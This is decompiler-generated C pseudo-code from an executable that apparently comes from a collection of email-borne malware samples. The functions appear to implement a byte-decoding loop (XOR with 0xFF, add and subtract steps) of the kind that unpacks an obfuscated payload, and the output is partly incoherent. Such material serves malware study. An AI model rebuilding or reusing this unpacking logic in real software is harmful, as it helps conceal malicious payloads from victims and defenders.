// subject.c
// Generated on 5/4/2015 12:14:27 AM by decompiling malware_via_email/malware_0039/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 ebx, word32 ebp, word32 edi)
{
	word32 edx_16;
	word32 ebp_17;
	word32 eax_18 = fn00401078(out edx_16, out ebp_17);
	Mem24[fp - 0x00000018:word32] = Mem0[0x00404400:word32];
	Mem26[fp - 0x0000001C:word32] = 0x00402000;
	fn00401133(eax_18, edx_16, ebx, ebp_17, edi, SLICE(ebp, selector, 16));
	Mem36[fp - 0x00000012:word32] = 0x0000062E;
	Mem38[fp - 0x00000016:word32] = 0x00401133;
	word32 edx_39;
	word32 ebp_40;
	fn00401078(out edx_39, out ebp_40);
	if (false)
	{
		Mem53[fp - 0x00000012:word32] = 0x00405000;
		Mem55[fp - 0x00000016:word32] = 0x00401000;
		lstrcpyA(Mem55[fp - 0x00000016:LPSTR], Mem55[fp - 18:LPCSTR]);
	}
	return;
}

word32 fn00401078(ptr32 edxOut, ptr32 ebpOut)
{
	word32 edx_9;
	word32 ebp_10;
	return fn00401127(fp - 0x00000004, out edx_9, out ebp_10);
}

word32 fn004010F1(word32 ebp, ptr32 edxOut, ptr32 ebpOut)
{
	eax = fn00401127(ebp, out edx, out ebp);
	al = (byte) eax;
}

word32 fn0040110D(word32 eax, word32 ebp, ptr32 edxOut, ptr32 ebpOut)
{
	esp = fp;
	v4 = Mem0[ebp + 0x00000017:byte] << 0x8B;
	Mem0[ebp + 0x00000017:byte] = v4;
	SCZO = cond(v4);
	eax = fn00401111(eax, ebp, out edx, out ebp);
	return eax;
}

word32 fn00401111(word32 eax, word32 ebp, ptr32 edxOut, ptr32 ebpOut)
{
	esp = fp;
	ebp = ebp + 0x00000001;
	D = false;
	ecx = Mem0[ebp + 0x00000008:word32];
	ecx = ecx + eax;
	eax = Mem0[ebp - 0x00000004:word32];
	eax = eax + Mem0[ebp + 0x00000008:word32];
	edx = Mem0[ebp - 0x00000004:word32];
	dl = (byte) edx;
	al = Mem0[eax + 0x00000000:byte];
	al = al - dl;
	SCZO = cond(al);
	Mem0[ecx + 0x00000000:byte] = al;
	eax = fn00401127(ebp, out edx, out ebp);
	al = (byte) eax;
	return eax;
}

word32 fn00401127(word32 ebp, ptr32 edxOut, ptr32 ebpOut)
{
	eax = ebp - 0x00000004;
	edx_eax = SEQ(edx, eax);
	v4 = Mem0[eax + 0x00000000:word32] + 0x00000001;
	Mem0[eax + 0x00000000:word32] = v4;
	SZO = cond(v4);
	eax = Mem0[ebp - 0x00000004:word32];
	edx_eax = SEQ(edx, eax);
	al = (byte) eax;
	SCZO = cond(eax - Mem0[ebp + 0x0000000C:word32]);
	SO = SCZO;
	if (Test(LT,SO))
	{
		SCZO = cond(Mem0[ebp - 0x00000004:word32] - 0x00000001);
		SZO = SCZO;
		if (Test(GT,SZO))
		{
			eax = Mem0[ebp - 0x00000004:word32];
			ecx = Mem0[ebp + 0x00000008:word32];
			ecx = ecx + eax;
			eax = Mem0[ebp - 0x00000004:word32];
			edx = Mem0[ebp + 0x00000008:word32];
			edx = edx + eax;
			al = 0xFF;
			al = 0xFF ^ Mem0[edx + 0x00000000:byte];
			SZO = cond(al);
			C = false;
			Mem0[ecx + 0x00000000:byte] = al;
		}
		SCZO = cond(Mem0[ebp - 0x00000004:word32] - 0x00000001);
		SZO = SCZO;
		if (Test(GT,SZO))
		{
			eax = Mem0[ebp - 0x00000004:word32];
			eax = eax - 0x00000001;
			eax = eax & 0x00000003;
			SZO = cond(eax & eax);
			Z = SZO;
			C = false;
			if (Test(EQ,Z))
			{
				eax = Mem0[ebp - 0x00000004:word32];
				edx = Mem0[ebp + 0x00000008:word32];
				edx = edx + eax;
				eax = Mem0[ebp - 0x00000004:word32];
				eax = eax + Mem0[ebp + 0x00000008:word32];
				al = Mem0[eax + 0x00000000:byte];
				eax = DPB(eax, al, 0, 8);
				eax = eax + 0x00000007;
				al = (byte) eax;
				SCZO = cond(eax);
				Mem0[edx + 0x00000000:byte] = al;
			}
		}
		SCZO = cond(Mem0[ebp - 0x00000004:word32] - 0x00000003);
		SZO = SCZO;
		if (Test(GT,SZO))
		{
			edx = Mem0[ebp - 0x00000004:word32];
			edx = edx - 0x00000003;
			eax = 0x00000003;
			ecx = 0x00000003;
			eax = edx;
			edx = edx >> 0x0000001F;
			edx_eax = SEQ(edx, eax);
			edx = edx_eax % 0x00000003;
			edx_eax = SEQ(edx, eax);
			eax = edx_eax / 0x00000003;
			SZO = cond(edx & edx);
			Z = SZO;
			C = false;
			if (Test(EQ,Z))
			{
				eax = fn004010F1(ebp, out edx, out ebp);
				edx_eax = SEQ(edx, eax);
				al = (byte) eax;
				return eax;
			}
			else
			{
				eax = fn004010F1(ebp, out edx, out ebp);
				edx_eax = SEQ(edx, eax);
				al = (byte) eax;
				return eax;
			}
		}
		else
		{
			eax = fn004010F1(ebp, out edx, out ebp);
			edx_eax = SEQ(edx, eax);
			al = (byte) eax;
			return eax;
		}
	}
	else
	{
		esp = ebp;
		ebp = Mem0[esp + 0x00000000:word32];
		esp = esp + 0x00000004;
		return eax;
	}
}

void fn00401133(word32 eax, word32 edx, word32 ebx, word32 ebp, word32 edi, selector psegArg02)
{
fn00401133_entry:
	goto l00401133
l00401132_in_fn00401133:
	return
l00401133:
	Mem6[eax + 0x00000000:word32] = ebx
	branch SZO l00401147
l00401138:
	branch SZO l00401138_thunk_fn004010F1
	goto l0040113A
l00401138_thunk_fn004010F1:
	word32 edx_47
	word32 ebp_48
	fn004010F1(ebp, out edx_47, out ebp_48)
	return
l0040113A:
	branch edi < 0x00000001 l00401132_in_fn00401133
l0040113F:
	__inb(DPB(dx, 0x87, 8, 8))
l00401147:
	branch P l00401156_thunk_fn0040110D
	goto l00401158
l00401156_thunk_fn0040110D:
	word32 edx_81
	word32 ebp_82
	fn0040110D(edx - 0x51E000A7, ebp, out edx_81, out ebp_82)
	return
l00401158:
	return
fn00401133_exit:
}

